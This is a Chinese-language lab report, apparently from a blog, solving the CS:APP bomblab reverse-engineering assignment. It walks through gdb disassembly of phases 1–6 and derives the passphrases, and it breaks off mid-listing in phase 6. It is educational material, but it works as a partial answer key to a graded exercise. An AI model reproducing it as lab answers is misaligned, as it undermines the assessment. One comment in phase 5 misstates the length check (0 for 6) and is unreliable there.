<p>本文介绍了笔者在做 bomblab 一节的实验报告。该 lab 要求通过 gdb 等工具，调试二进制执行文件，阅读理解汇编指令，并找到避免炸弹的正确口令，阻止炸弹爆炸。</p>
<span id="more"></span>
<h2 id="phase-1">phase 1</h2>
<p>首先，通过阅读代码，可以发现 <code>phase_1</code> 这个函数内对读取的口令进行检查，如果函数正确退出，则拆弹完成。使用 <code>gdb</code> 对该函数反汇编可以得到如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以发现，核心是通过 <code>strings_not_equal</code> 比较口令与 0x402400 地址的字符串是否相同，若不同则引发爆炸。虽然直觉上可以这么理解，但验证正确需要更谨慎一点，需要确认：</p>
<ul>
<li><code>strings_not_equal</code> 是不是如其名，判断字符串相同</li>
<li><code>strings_not_equal</code> 的返回值，是否 0 代表相同</li>
</ul>
<p>详细的确认需要逐句读汇编，也可以简单确认一下，直接在 <code>0x0000000000400eee</code> 处打断点。输入时输入 0x402400 地址对应的字符串，观察<span class="math inline"> \(eax\)</span> 的值即可。测试发现即可直接通过，可以节省阅读汇编的时间。</p>
<h2 id="phase-2">phase 2</h2>
<p>难度略微加大。同样地，首先反汇编 <code>phase_2</code>，结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">   0x0000000000400efc &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x0000000000400efd &lt;+1&gt;:     push   %rbx</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx</span><br><span class="line">   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp</span><br><span class="line">   0x0000000000400f42 &lt;+70&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，核心是调用了 <code>read_six_numbers</code> 函数，这个函数需要两个参数，第一个是 <code>read_line</code> 得到的字符串，存储在 <code>rdi</code> 中没有被修改，第二个是 <code>rsi</code>，在栈 <code>rsp</code> 上开辟了 0x28 的空间，猜测应该是一个大小为 10 的 int 数组。同时观察到后续没有使用 <code>eax</code> 的逻辑，这个函数应该是无返回值的。接着反汇编 <code>read_six_numbers</code>，结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax</span><br><span class="line">   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:    retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到核心逻辑在 + 54 附近，对<code>__isoc99_sscanf@plt</code> 的返回值进行校验，如果不满足 <code>&gt;5</code>，则引爆炸弹。sscanf 的函数签名如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sscanf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>即从 str 读取格式化输入，返回成功匹配和赋值的个数。打印 0x4025c3 处的模板字符串可知，格式为 "% d % d % d % d % d % d"，符合这个函数的命名。因此第一步，口令需要按这个格式以六个整数开头。</p>
<p>回到 <code>phase_2</code>，发现还有两个导致炸弹引爆的因素：</p>
<ul>
<li>+18：第一个元素值不为 1</li>
<li>+34：两个值不相等</li>
</ul>
<p>阅读 + 52 到 + 62，再到 + 34 可知，第二个约束时要求数组的下一个元素需要是这一个的两倍大，进而可以得到正确的口令。</p>
<h2 id="phase-3">phase 3</h2>
<p>与 Phase 2 类似，也是考察 <code>sscanf</code>。反汇编 <code>phase_3</code> 得到：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">   0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;  // 读入两个整数，存储于rdx(rsp+8), rcx(rsp+12)</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax</span><br><span class="line">   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp) </span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt; // 第一个数如果&gt;7, 则爆炸</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8) // 第一个数用于计算跳转偏移，基础位置是 0x400f7c</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt; // 第二个数与eax不同，则爆炸</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:   retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以发现，只需要根据第一个数确定 eax 取值，也就是第二个数，就可以通过这个 phase。根据 <code>jmpq</code> 猜测源码中有 <code>switch</code>，<code>jmpq</code> 下面的部分就是跳转表。</p>
<h2 id="phase-4">phase 4</h2>
<p>首先反汇编 <code>phase4</code>：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">=&gt; 0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx // num2 </span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx // num1 </span><br><span class="line">   0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi // "%d %d"</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt; // 读不到两个数，爆炸</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt; // num1&lt;=0xe, 避免爆炸</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:    test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt; // 若func4结果不为0, 爆炸</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp) </span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt; // num2==0, 避免爆炸</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:    retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>调用 <code>func4</code> 之前的代码很好理解，依然是读数 + 校验。<code>func4</code> 接收三个参数，分别是 num1、0、0xe，返回值若不为 0 则会爆炸。<code>func4</code> 反汇编如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax // </span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax // eax=para3-para2</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx // ecx=para3-para2</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx // ecx&gt;&gt;=31 &lt;=&gt; ecx=sign(ecx) = 0 or 1</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax // eax+=ecx</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:    sar    %eax // eax 算数右移 1 位</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx // ecx=rax+rsi</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt; // ecx&lt;=edi=num1</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx // edx=rcx-1</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt; // ecx&gt;=edi</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:    retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出，<code>func4</code> 会递归调用本身。首先要思考，func4 在什么情况下不会调用自己，可以发现：</p>
<ul>
<li>+22-&gt;+36：ecx&lt;=edi=num1</li>
<li>+43-&gt;+57：ecx&gt;=edi</li>
</ul>
<p>两个均成立时，ecx=edi，返回值 eax=0，那么只需要根据 ecx 确定 num1 即可。</p>
<h2 id="phase-5">phase 5</h2>
<p>首先反汇编：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt; // 字符串长度不为0，则爆炸</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx // ecx=input[i]</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx // rdx=input[i]</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx // edx %=16</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx // maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1) // input[i]=s[edx]</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax // rax+=1</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt; // !=6循环</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi // 秘钥 flyers</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi // 修改后的输入</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt; // eax!=0，爆炸</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax // 循环变量 eax=0</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:   retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出，输入的口令需要是一个长度为 6 的字符串，在循环内部对字符串每一位进行了修改，具体是取 ascii%16 的值，作为另一个字符串的下标索引，映射得到新字符串。反过来，就可以得到原始口令。%16 的结果应该为 9,15,14,5,6,7，对应到 ASCII 即可。</p>
<h2 id="phase-6">phase 6</h2>
<p>老规矩，先反汇编：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:     push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:     push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:     push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:     push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:     push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi // int[6]</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d // 循环变量i</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp // </span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax </span><br><span class="line">   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax // eax=a[i]-1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt; // 1&lt;=a[i]&lt;=6, 避免爆炸, jbe是无符号比较</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d // i+=1</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt; // 循环结束</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx // 内层循环，j=i</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax </span><br><span class="line">   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt; // a[j]!=a[i], j&gt;i, 否则爆炸</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt; //</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx // j=j+1</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt; // j&lt;=5, 跳转至65</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13 // a[i] 地址自增4</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi // 循环结束，新循环开始，数组边界</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx  </span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax) // a[i]=7-a[i]</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax // i+=1</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt; // i&lt;6</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi // 循环变量</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt; // 重复a[i]次</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2) // (void*)[6] B B[i]=0x6032d0</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi // i+=1</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt; // 循环结束</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx // 循环开始, ecx=a[i]</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt; // a[i]&lt;=1</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx // 循环结束, B[0]</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax // &amp;B[1]</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi // 循环边界</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx // B[i]</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx // B[i+1]</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx) // *(B[i]+8)=B[i+1] &lt;=&gt; B[i].next=B[i+1]</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax // i+=1</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt; // 循环结束</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx // </span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx) // 循环结束</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp // 循环变量 i=5</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:   mov    